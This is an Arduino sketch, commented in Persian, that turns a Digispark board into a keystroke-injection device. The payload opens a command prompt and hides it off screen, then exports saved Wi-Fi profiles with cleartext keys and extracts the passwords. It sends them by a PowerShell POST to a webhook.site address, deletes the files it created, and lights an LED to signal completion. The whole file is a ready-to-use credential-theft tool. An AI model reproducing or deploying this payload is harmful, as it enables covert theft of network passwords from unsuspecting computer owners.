#include "DigiKeyboard.h"
#define KEY_DOWN 0x51
#define KEY_ENTER 0x28
void setup() {
  
pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //فشرده شدن کلید ویندوز + R برای باز کردن cmd
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //کوچک کردن پنجره cmd
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //فشردن دکمه Alt چپ و space برای باز کردن منوی cmd 
  DigiKeyboard.sendKeyStroke(KEY_M); //انتخاب حالت جابه جایی
  for(int i =0; i < 110; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN); //انتقال به پایین ترین نقطه برای مخفی شدن
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //خارج شدن از حالت جابه جایی
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%"); //رفتن به دایرکتوری temp
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear"); //استخراج وای فای ها و ذخیره در مسیر temp
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //استخراج پسورد ها و ذخیره در مسیر temp
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/13d30205-22d9-4914-9f74-1823fd9ea6ba -Method POST -InFile Wi-Fi-PASS"); //ارسال اطلاعات به دست امده به سایت هوک
  DigiKeyboard.delay(500);
  DigiKeyboard.println("del Wi-* /s /f /q"); //پاک کردن تمام فایل های ساخته شده
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit"); //خروج از cmd
  DigiKeyboard.delay(100);
  
  digitalWrite(1, HIGH); //روشن شدن چراغ به معنی اتمام کار
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
